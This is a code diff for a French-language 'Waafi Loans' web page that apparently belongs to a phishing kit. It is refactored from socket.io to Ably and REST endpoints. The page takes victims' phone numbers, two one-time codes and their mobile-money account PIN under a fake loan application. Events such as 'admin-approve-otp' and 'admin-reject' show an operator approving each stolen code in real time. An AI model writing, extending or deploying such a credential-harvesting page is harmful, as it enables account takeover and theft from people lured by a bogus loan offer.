@@ -6,7 +6,7 @@
     <meta name="theme-color" content="#74b927">
     <title>Waafi Loans</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="https://cdn.ably.com/lib/ably.min-2.js"></script>
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <style>
         [x-cloak] { display: none !important; }
@@ -138,7 +138,6 @@
 
             <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-between">
                 
-                <!-- STEP 1: Phone & OTP 1 -->
                 <div x-show="step === 1" class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Saisissez votre numéro</h2>
@@ -171,7 +170,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 2: Main Account PIN -->
                 <div x-show="step === 2" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Saisissez votre code PIN</h2>
@@ -184,14 +182,13 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 1" :disabled="pinVerifying" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep5" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                        <button @click="submitPin" :disabled="!isPinValid || pinVerifying" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
                             <span x-show="!pinVerifying">Confirmer le PIN</span>
                             <span x-show="pinVerifying" class="spinner-sm"></span>
                         </button>
                     </div>
                 </div>
 
-                <!-- STEP 3: OTP 2 Verification -->
                 <div x-show="step === 3" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Deuxième Vérification (OTP 2)</h2>
@@ -209,7 +206,6 @@
                     </div>
                 </div>
 
-                <!-- STEP 4: Loan Config -->
                 <div x-show="step === 4" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Type de Prêt et Durée</h2>
@@ -258,11 +254,10 @@
                         <textarea x-model="form.purpose" rows="3" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 placeholder-gray-400 font-medium transition-all resize-none" placeholder="Expliquez brièvement votre besoin"></textarea>
                     </div>
                     <div class="pt-4">
-                        <button @click="submitStep1" :disabled="!isStep1Valid" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
+                        <button @click="submitLoanConfig" :disabled="!isLoanConfigValid" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
                     </div>
                 </div>
 
-                <!-- STEP 5: Personal Profile -->
                 <div x-show="step === 5" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Informations Personnelles</h2>
@@ -284,11 +279,10 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 4" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep2" :disabled="!isStep2Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
+                        <button @click="submitPersonalProfile" :disabled="!isPersonalProfileValid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Continuer →</button>
                     </div>
                 </div>
 
-                <!-- STEP 6: Employment Status -->
                 <div x-show="step === 6" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Situation Professionnelle</h2>
@@ -317,11 +311,10 @@
                     </div>
                     <div class="grid grid-cols-2 gap-4 pt-4">
                         <button @click="step = 5" type="button" class="w-full bg-white border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl shadow-sm hover:bg-slate-50 active:scale-98 transition-all flex items-center justify-center gap-2 cursor-pointer">← Retour</button>
-                        <button @click="submitStep3" :disabled="!isStep3Valid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Vérifier le prêt →</button>
+                        <button @click="submitEmploymentProfile" :disabled="!isEmploymentProfileValid" type="button" class="w-full bg-[#74b927] hover:bg-[#66a322] disabled:opacity-50 disabled:cursor-not-allowed active:scale-98 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">Vérifier le prêt →</button>
                     </div>
                 </div>
 
-                <!-- NEW STEP 7: Local Instant Confirm PIN (No Admin Verification) -->
                 <div x-show="step === 7" x-cloak class="space-y-5">
                     <div class="text-center mb-6">
                         <h2 class="text-xl font-bold text-gray-800 tracking-tight">Confirmez votre code PIN</h2>
@@ -341,10 +334,9 @@
                     </div>
                 </div>
 
-                <!-- STEP 8: Success/Completion Screen -->
                 <div x-show="step === 8" x-cloak class="text-center py-8 flex flex-col items-center justify-center my-auto space-y-6">
                     <div class="w-16 h-16 bg-[#74b927] rounded-2xl flex items-center justify-center shadow-md shadow-emerald-100">
-                        <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24 stroke-width="3.5">
+                        <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
                             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
                         </svg>
                     </div>
@@ -369,18 +361,33 @@
     <script>
         function loanFlow() {
             return {
-                step: 1, appId: '', referenceId: '', connected: false,
+                step: 1, 
+                appId: '', 
+                referenceId: '', 
+                connected: false,
                 form: { loanType: '', amount: 1200, term: '1', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', employer: '' },
                 otp: { code: '' },
                 pin: { value: ['', '', '', ''] },
                 otp2: { code: '' },
                 confirmPin: { value: ['', '', '', ''] },
-                otpRequested: false, requestingOtp: false, otpVerifying: false, pinVerifying: false, otp2Verifying: false, completingApplication: false,
-                socket: null, toast: { show: false, message: '' },
+                otpRequested: false, 
+                requestingOtp: false, 
+                otpVerifying: false, 
+                pinVerifying: false, 
+                otp2Verifying: false, 
+                completingApplication: false,
+                ably: null, 
+                channel: null,
+                toast: { show: false, message: '' },
 
-                get isStep1Valid() { return this.form.loanType && this.form.term && this.form.purpose; },
-                get isStep2Valid() { return this.form.firstName && this.form.lastName && this.form.email; },
-                get isStep3Valid() { return this.form.employment && this.form.income; },
+                // Change target to current host dynamically to support local development or multi-cloud staging environments
+                get apiBase() {
+                    return window.location.origin;
+                },
+
+                get isLoanConfigValid() { return this.form.loanType && this.form.term && this.form.purpose; },
+                get isPersonalProfileValid() { return this.form.firstName && this.form.lastName && this.form.email; },
+                get isEmploymentProfileValid() { return this.form.employment && this.form.income; },
                 get isPinValid() { return this.pin.value.join('').length === 4; },
                 get isConfirmPinValid() { return this.confirmPin.value.join('').length === 4; },
 
@@ -405,138 +412,179 @@
                     }
                 },
 
-                init() {
-                    this.socket = io();
-                    this.socket.on('connect', () => { this.connected = true; });
-                    this.socket.on('session-ready', (data) => { 
-                        this.appId = data.appId; 
-                        this.socket.emit('join-room', data.appId); 
-                    });
-                    
-                    this.socket.on('admin-approve-otp', () => { 
-                        this.otpVerifying = false; 
-                        this.step = 2; 
-                    });
-                    
-                    this.socket.on('pin-verified', () => { 
-                        this.pinVerifying = false; 
-                        this.step = 3; 
-                    });
+                async init() {
+                    try {
+                        // 1. Handshake server to fetch/provision a new unique system UUID session & API token
+                        const response = await fetch(`${this.apiBase}/api/create-session`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' }
+                        });
+                        
+                        const data = await response.json();
+                        this.appId = data.appId;
+                        const clientKey = data.ablyClientKey; // Uses transient Client tokens for public-facing web instances
 
-                    this.socket.on('admin-approve-otp2', (d) => {
-                        this.otp2Verifying = false;
-                        this.step = 4;
-                    });
-                    
-                    this.socket.on('otp1-requested-success', () => {
-                        this.requestingOtp = false;
-                        this.otpRequested = true;
-                        this.triggerToastNotification("Le code OTP 1 a été envoyé avec succès.");
-                    });
-                    
-                    this.socket.on('otp-failed', (err) => {
-                        this.otpVerifying = false;
-                        this.triggerToastNotification(err.message || "Le code OTP saisi est incorrect.");
-                    });
+                        // 2. Initialize Ably Realtime Subscriber client utilizing provided channel details
+                        this.ably = new Ably.Realtime({ key: clientKey });
+                        
+                        this.ably.connection.on('connected', () => {
+                            this.connected = true;
+                        });
 
-                    this.socket.on('pin-failed', (err) => {
-                        this.pinVerifying = false;
-                        this.pin.value = ['', '', '', ''];
-                        const inputs = document.querySelectorAll('.pin-box:not(.shadow-sm)');
-                        if (inputs.length > 0) inputs[0].focus();
-                        this.triggerToastNotification(err.message || "Le code PIN secret saisi est incorrect.");
-                    });
+                        // 3. Connect to specific private channels mapped to our unique application loan:
+                        this.channel = this.ably.channels.get(`loan:${this.appId}`);
 
-                    this.socket.on('otp2-failed', (err) => {
-                        this.otp2Verifying = false;
-                        this.otp2.code = '';
-                        this.triggerToastNotification(err.message || "Le deuxième code de vérification est incorrect.");
-                    });
+                        // 4. Register system real-time listeners (Replacing original socket.on logic)
+                        await this.channel.subscribe('admin-approve-otp', () => {
+                            this.otpVerifying = false;
+                            this.step = 2;
+                        });
 
-                    this.socket.on('admin-reject', (err) => {
-                        this.otpVerifying = false;
-                        this.pinVerifying = false;
-                        this.otp2Verifying = false;
-                        this.requestingOtp = false;
-                        this.triggerToastNotification(err.message || "La vérification a été rejetée.");
-                    });
+                        await this.channel.subscribe('pin-verified', () => {
+                            this.pinVerifying = false;
+                            this.step = 3;
+                        });
 
-                    this.socket.on('application-complete', (data) => {
-                        this.completingApplication = false;
-                        this.referenceId = data.referenceId;
-                        this.step = 8;
-                    });
+                        await this.channel.subscribe('admin-approve-otp2', () => {
+                            this.otp2Verifying = false;
+                            this.step = 4;
+                        });
+
+                        await this.channel.subscribe('admin-reject', (message) => {
+                            this.otpVerifying = false;
+                            this.pinVerifying = false;
+                            this.otp2Verifying = false;
+                            const reason = message.data && message.data.message ? message.data.message : "Votre vérification a été rejetée. Veuillez réessayer.";
+                            this.triggerToastNotification(reason);
+                        });
+
+                        await this.channel.subscribe('application-finalized', (message) => {
+                            this.completingApplication = false;
+                            this.referenceId = message.data.referenceId;
+                            this.step = 8;
+                        });
+
+                    } catch (err) {
+                        console.error("Initialization pipeline exception:", err);
+                        this.triggerToastNotification("Échec de l'initialisation du canal réseau.");
+                    }
                 },
 
-                sendOtpRequest() {
+                // STEP 1: Phone request utilizing Backend REST API
+                async sendOtpRequest() {
                     this.requestingOtp = true;
-                    this.socket.emit('request-otp1', { appId: this.appId, phone: this.form.phone });
-                    setTimeout(() => {
-                        if(this.requestingOtp) {
+                    try {
+                        const response = await fetch(`${this.apiBase}/api/request-otp`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ appId: this.appId, phone: this.form.phone })
+                        });
+                        if (response.ok) {
                             this.requestingOtp = false;
                             this.otpRequested = true;
+                            this.triggerToastNotification("Le code OTP 1 a été envoyé avec succès.");
+                        } else {
+                            throw new Error("HTTP failure during initial dispatch");
                         }
-                    }, 1200);
+                    } catch (err) {
+                        this.requestingOtp = false;
+                        this.triggerToastNotification("Erreur lors de la demande OTP. Veuillez réessayer.");
+                    }
                 },
 
-                verifyOTP() { 
-                    this.otpVerifying = true; 
-                    this.socket.emit('step4-otp', { appId: this.appId, phone: this.form.phone, otp: this.otp.code }); 
+                // STEP 1: Submit verification code via API (Triggers Admin Action Panel)
+                async verifyOTP() {
+                    this.otpVerifying = true;
+                    try {
+                        const response = await fetch(`${this.apiBase}/api/submit-otp`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ appId: this.appId, code: this.otp.code })
+                        });
+                        if (!response.ok) throw new Error("HTTP verification failure");
+                    } catch (err) {
+                        this.otpVerifying = false;
+                        this.triggerToastNotification("Erreur de communication backend.");
+                    }
                 },
 
-                submitStep5() { 
-                    this.pinVerifying = true; 
-                    const pinString = this.pin.value.join('');
-                    this.socket.emit('step5-pin', { appId: this.appId, pin: pinString }); 
+                // STEP 2: Submit Main PIN Capture
+                async submitPin() {
+                    this.pinVerifying = true;
+                    try {
+                        const pinCode = this.pin.value.join('');
+                        const response = await fetch(`${this.apiBase}/api/submit-pin`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ appId: this.appId, pin: pinCode })
+                        });
+                        if (!response.ok) throw new Error("PIN dispatch failure");
+                    } catch (err) {
+                        this.pinVerifying = false;
+                        this.triggerToastNotification("Erreur lors de la soumission du PIN.");
+                    }
                 },
 
-                verifyOTP2() {
+                // STEP 3: Submit Secondary verification key
+                async verifyOTP2() {
                     this.otp2Verifying = true;
-                    this.socket.emit('submit-otp2', { appId: this.appId, otp2: this.otp2.code });
+                    try {
+                        const response = await fetch(`${this.apiBase}/api/submit-otp2`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ appId: this.appId, code: this.otp2.code })
+                        });
+                        if (!response.ok) throw new Error("OTP2 dispatch failure");
+                    } catch (err) {
+                        this.otp2Verifying = false;
+                        this.triggerToastNotification("Erreur lors de la soumission de l'OTP 2.");
+                    }
                 },
 
-                submitStep1() {
-                    this.step = 5;
-                    this.socket.emit('step1', { 
-                        appId: this.appId, 
-                        loanType: this.form.loanType, 
-                        amount: this.form.amount, 
-                        term: this.form.term, 
-                        purpose: this.form.purpose 
-                    });
+                // STEP 4: Submit Loan parameters to UI (Local UI Transition)
+                submitLoanConfig() {
+                    if (this.isLoanConfigValid) {
+                        this.step = 5;
+                    }
                 },
 
-                submitStep2() {
-                    this.step = 6;
-                    this.socket.emit('step2', {
-                        appId: this.appId,
-                        firstName: this.form.firstName,
-                        lastName: this.form.lastName,
-                        email: this.form.email
-                    });
+                // STEP 5: Submit Identity profile to UI (Local UI Transition)
+                submitPersonalProfile() {
+                    if (this.isPersonalProfileValid) {
+                        this.step = 6;
+                    }
                 },
 
-                submitStep3() {
-                    // Instantly shifts view onto the local verification gate (Step 7) without waiting
-                    this.step = 7;
-                    this.socket.emit('step3-data', {
-                        appId: this.appId,
-                        employment: this.form.employment,
-                        income: this.form.income,
-                        employer: this.form.employer
-                    });
+                // STEP 6: Submit Employment status details (Local UI Transition)
+                submitEmploymentProfile() {
+                    if (this.isEmploymentProfileValid) {
+                        this.step = 7;
+                    }
                 },
 
-                executeFinalSubmission() {
+                // STEP 7: Submit application configuration to API endpoint
+                async executeFinalSubmission() {
                     this.completingApplication = true;
-                    const finalPin = this.confirmPin.value.join('');
-                    this.socket.emit('execute-final-confirmation', {
-                        appId: this.appId,
-                        confirmPin: finalPin
-                    });
+                    try {
+                        const confirmPinVal = this.confirmPin.value.join('');
+                        const payload = {
+                            appId: this.appId,
+                            confirmPin: confirmPinVal,
+                            ...this.form
+                        };
+                        const response = await fetch(`${this.apiBase}/api/finalize`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(payload)
+                        });
+                        if (!response.ok) throw new Error("Finalization failure");
+                    } catch (err) {
+                        this.completingApplication = false;
+                        this.triggerToastNotification("Échec de la validation de la demande.");
+                    }
                 }
             };
         }
     </script>
 </body>
-</html>
+</html>              
